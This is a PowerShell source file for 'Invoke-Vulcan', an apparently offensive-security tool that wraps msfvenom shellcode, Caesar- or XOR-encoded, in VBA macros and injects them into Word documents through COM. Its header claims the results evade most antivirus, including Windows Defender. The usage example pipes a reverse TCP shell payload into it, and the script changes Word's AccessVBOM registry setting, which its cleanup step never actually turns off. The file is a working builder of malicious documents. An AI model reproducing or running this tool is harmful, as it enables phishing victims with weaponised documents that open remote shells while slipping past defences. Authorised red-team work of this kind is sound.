function Invoke-Vulcan {
    <#
    .SYNOPSIS
        Streamlines the process of creating macro-enabled Word documents.

        Author: Alexandre Teyar (@aress31)
        License: BSD 3-Clause
        Required Dependencies: Windows Subsystem for Linux (WSL)
        Optional Dependencies: None

    .DESCRIPTION
        Using MSFVenom creates a macro-enabled Word document that - at the time
        of writing - evade most AVs, including Windows Defender.

    .PARAMETER Decoder
        Specifies the type of decoder to use, e.g., xor.

    .PARAMETER Decoder
        Path to the Visual Basic decoding function.

    .PARAMETER Key
        Specifies the key to use for the decoder.

    .PARAMETER OutputDirectory
        Folder to output files too.
    
    .PARAMETER OutputPrefix
        Prefix to add to output files.

    .PARAMETER ShellCode
        Specifies the (hex-encoded) shellcode to use.

    .PARAMETER Template
        Path to the Visual Basic template to use.

    .PARAMETER Treshold
        Specifies the threshold to use before breaking the shellcode array lines.
  
    .EXAMPLE
        PS C:\>  wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | 
        Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder caesar -DecoderPath ".\assets\decoders\caesar.vba -Key 5

        Creates a hex-formatted payload then bundle it into an empty macro-enabled Word document using the indirect template along with the Caesar decoder routine.
    #>

    [CmdletBinding(PositionalBinding = $False)]
    param(
        [ValidateSet("Caesar", "XOR")]
        [string]
        $Decoder,

        [ValidateScript({ Test-Path -Path $_ -PathType Leaf })]
        [String]
        $DecoderPath,

        [ValidateScript({ Test-Path -Path $_ -PathType Container })]
        [String]
        $OutputDirectory = $(Get-Location),

        [String]
        $OutputPrefix = "vulcan",

        [Parameter(Mandatory, ParameterSetName = 'B', ValueFromPipeline)]
        [string]
        $ShellCode,

        [Parameter(Mandatory)]
        [ValidateScript({ Test-Path -Path $_ -PathType Leaf })]
        [String]
        $Template,
        
        [int]
        $Treshold = 72
    )

    DynamicParam {
        $RuntimeParameterDictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]

        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute  
        $ParameterAttribute.Mandatory = $true

        $AttributeCollection.Add($ParameterAttribute)

        $ParameterName = "Key"

        switch ($Decoder) {
            "Caesar" {
                $ValidateRangeAttribute = New-Object System.Management.Automation.ValidateRangeAttribute(0, 255)
                $AttributeCollection.Add($ValidateRangeAttribute)

                $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($ParameterName, [int], $AttributeCollection)

            }
            "XOR" {
                $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($ParameterName, [string], $AttributeCollection)

            }
        }

        $RuntimeParameterDictionary.Add($ParameterName, $RuntimeParameter)

        return $RuntimeParameterDictionary
    }

    begin {
        $Key = $PsBoundParameters[$ParameterName]

        $MacroOutput = New-TemporaryFile
        Resolve-Path `
            -Path $(Join-Path -Path $OutputDirectory "${OutputPrefix}.$(Get-Date -Format yyyy-MM-dd_hh-mm-ss).doc") `
            -ErrorAction SilentlyContinue -ErrorVariable _frperror
        $WordOutput = $_frperror[0].TargetObject
    }

    process {
        Write-Output "[+] Enabling trust access to Visual Basic Project Object Model in Microsoft Word..."
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -Name "AccessVBOM" -Value 1

        Write-Verbose "Loading (hex-formatted) shellcode..."
        Create_MacroFromTemplate -Key $Key -Decoder $Decoder -DecoderPath $DecoderPath -ShellCode $ShellCode -Template $Template -Treshold $Treshold
        Create_WordDocument -MacroOutput $MacroOutput -Output $WordOutput
    }
    end {
        Write-Output "[-] Removing (Visual Basic) macro file..."
        Remove-Item -Path $MacroOutput -Force
        
        Write-Output "[-] Disabling trust access to Visual Basic Project Object Model in Microsoft Word..."
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -Name "AccessVBOM" -Value 1
    }
}

function Format-HexArray($HexArray, $Treshold) {
    foreach ($x in $HexArray) {
        $x = $x.ToUpper()

        if ($i -eq $Treshold) {
            $Payload += "Chr(&H${x}), _`r`n"
            $i = 0
        } 
        else {
            $Payload += "Chr(&H${x}),"
            $i += 1
        }
    }

    $ForbiddenChars = @{
        "00" = "0"
        "01" = "1"
        "02" = "2"
        "03" = "3"
        "04" = "4"
        "05" = "5"
        "06" = "6"
        "07" = "7"
        "08" = "8"
        "09" = "9"
        "0A" = "A"
        "0B" = "B"
        "0C" = "C"
        "0D" = "D"
        "0E" = "E"
        "0F" = "F"
    }

    foreach ($x in $ForbiddenChars.GetEnumerator()) {
        $Payload = $Payload.Replace($x.Name, $x.Value)
    }

    return $Payload
}

function Convert-HexToHexArray($ShellCode, $Treshold) {
    $HexArray = $ShellCode -Split '(.{2})' -ne '' 
    $Payload = Format-HexArray -HexArray $HexArray -Treshold $Treshold

    return $Payload.Substring(0, $Payload.Length - 1) 
}

function Create_MacroFromTemplate($Decoder, $DecoderPath, $Key, $ShellCode, $Template, $Treshold) {
    Write-Verbose "Creating (Visual Basic) macro..."
    $PayloadArray = Convert-HexToHexArray -ShellCode $ShellCode -Treshold $Treshold
    Write-Debug "Create_MacroFromTemplate->`$PayloadArray: $PayloadArray"

    switch ($Decoder) {
        "Caesar" {
            Write-Verbose "[i] Adding the $Decoder decoding routine"

            Set-Content -Path $MacroOutput -Value (
                Get-Content -Path $Template).Replace(
                "PAYLOAD", "Array(" + $PayloadArray + ')' + 
                "`r`n" + "`r`n" + "`t" + "kUG HoR, " + $Key)
            Add-Content -Path $MacroOutput -Value (Get-Content -Path $DecoderPath)
        }
        "XOR" {
            Write-Verbose "[i] Adding the $Decoder decoding routine"

            Set-Content -Path $MacroOutput -Value (
                Get-Content -Path $Template).Replace(
                "PAYLOAD", "Array(" + $PayloadArray + ')' + 
                "`r`n" + "`r`n" + "`t" + "kUG HoR, " + '"' + $Key + '"')
            Add-Content -Path $MacroOutput -Value (Get-Content -Path $DecoderPath)
        }
        Default {
            Set-Content -Path $MacroOutput -Value (
                (Get-Content -Path $Template).Replace("PAYLOAD", "Array(" + $PayloadArray + ')'))
        }
    }

    Write-Output "[+] (Visual Basic) macro written to: $MacroOutput"
}

function Create_WordDocument($MacroOutput, $Output) {
    Write-Verbose "Creating (macro-enabled) Word document..."
    $Word = New-Object -ComObject Word.Application
    $Doc = $Word.Documents.Add()

    $DocModule = $Doc.VBProject.VBComponents.Add(1)
    $DocModule.CodeModule.AddFromFile($MacroOutput)

    Write-Output "[+] Word document written to: $Output" 
    $Doc.SaveAs($Output, 0)

    $Doc.Close()
    $Word.Quit()
}